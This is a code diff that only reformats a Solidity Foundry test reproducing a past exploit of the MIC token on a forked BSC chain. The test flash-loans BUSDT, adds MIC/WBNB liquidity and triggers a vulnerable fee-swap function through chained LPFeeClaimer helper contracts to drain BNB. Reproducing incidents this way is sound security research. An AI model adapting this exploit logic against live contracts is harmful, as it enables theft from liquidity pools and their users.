@@ -36,7 +36,7 @@ contract ContractTest is Test {
     address private constant exploiter = 0x1703062d657c1ca439023F0993D870F4707a37FF;
     address private constant attackContract = 0xaFEBc0A9e26fea567cC9E6Dd7504800c67f4E3fE;
 
-    uint256 private constant flashBUSDTAmount = 1_700e18;
+    uint256 private constant flashBUSDTAmount = 1700e18;
 
     function setUp() public {
         vm.createSelectFork("bsc", blocknumToForkFrom);
@@ -53,18 +53,14 @@ contract ContractTest is Test {
         deal(address(BUSDT), address(this), 0);
         deal(address(this), 0);
         emit log_named_decimal_uint(
-            "Exploiter BUSDT balance before attack",
-            BUSDT.balanceOf(address(this)),
-            BUSDT.decimals()
+            "Exploiter BUSDT balance before attack", BUSDT.balanceOf(address(this)), BUSDT.decimals()
         );
 
         // Flashloan 1700 BUSDT tokens
         BUSDT_USDC.flash(address(this), flashBUSDTAmount, 0, abi.encodePacked(uint8(0)));
 
         emit log_named_decimal_uint(
-            "Exploiter BUSDT balance after attack",
-            BUSDT.balanceOf(address(this)),
-            BUSDT.decimals()
+            "Exploiter BUSDT balance after attack", BUSDT.balanceOf(address(this)), BUSDT.decimals()
         );
     }
 
@@ -81,12 +77,7 @@ contract ContractTest is Test {
         BUSDTToBNB();
         // Add liquidity to MIC/WBNB pair. Obtain LP tokens
         Router.addLiquidityETH{value: address(this).balance}(
-            address(MIC),
-            MIC.balanceOf(address(this)),
-            0,
-            0,
-            address(this),
-            block.timestamp + 10
+            address(MIC), MIC.balanceOf(address(this)), 0, 0, address(this), block.timestamp + 10
         );
 
         // Following function make a call to vulnerable swapAndSendLPFee private function
@@ -105,9 +96,7 @@ contract ContractTest is Test {
             // Main (this) attack contract has been approved from current helper attack contract to transfer
             // LP tokens to new helper attack contract
             MIC_WBNB.transferFrom(
-                address(currentLpFeeClaimer),
-                address(newLpFeeClaimer),
-                MIC_WBNB.balanceOf(address(currentLpFeeClaimer))
+                address(currentLpFeeClaimer), address(newLpFeeClaimer), MIC_WBNB.balanceOf(address(currentLpFeeClaimer))
             );
             newLpFeeClaimer.claim();
             currentLpFeeClaimer = newLpFeeClaimer;
@@ -153,11 +142,7 @@ contract ContractTest is Test {
         path[0] = address(BUSDT);
         path[1] = address(MIC);
         Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
-            BUSDT.balanceOf(address(this)) / 2,
-            0,
-            path,
-            address(this),
-            block.timestamp + 10
+            BUSDT.balanceOf(address(this)) / 2, 0, path, address(this), block.timestamp + 10
         );
     }
 
@@ -166,11 +151,7 @@ contract ContractTest is Test {
         path[0] = address(BUSDT);
         path[1] = address(WBNB);
         Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
-            BUSDT.balanceOf(address(this)),
-            0,
-            path,
-            address(this),
-            block.timestamp + 10
+            BUSDT.balanceOf(address(this)), 0, path, address(this), block.timestamp + 10
         );
     }
 
@@ -179,10 +160,7 @@ contract ContractTest is Test {
         path[0] = address(WBNB);
         path[1] = address(BUSDT);
         Router.swapExactETHForTokensSupportingFeeOnTransferTokens{value: address(this).balance}(
-            0,
-            path,
-            address(this),
-            block.timestamp + 10
+            0, path, address(this), block.timestamp + 10
         );
     }
 }
@@ -211,16 +189,11 @@ contract LPFeeClaimer {
         MIC_WBNB.approve(address(Router), type(uint256).max);
         MIC.approve(address(Router), type(uint256).max);
         Router.removeLiquidityETHSupportingFeeOnTransferTokens(
-            address(MIC),
-            MIC_WBNB.balanceOf(address(this)),
-            0,
-            0,
-            address(this),
-            block.timestamp + 10
+            address(MIC), MIC_WBNB.balanceOf(address(this)), 0, 0, address(this), block.timestamp + 10
         );
         MICToBNB();
         // Transfer BNB to main attack contract
-        (bool success, ) = msg.sender.call{value: address(this).balance}("");
+        (bool success,) = msg.sender.call{value: address(this).balance}("");
         require(success, "Transfering BNB not successful");
     }
 
@@ -232,11 +205,7 @@ contract LPFeeClaimer {
         path[1] = address(WBNB);
 
         Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
-            MIC.balanceOf(address(this)),
-            0,
-            path,
-            msg.sender,
-            block.timestamp + 10
+            MIC.balanceOf(address(this)), 0, path, msg.sender, block.timestamp + 10
         );
     }
 }
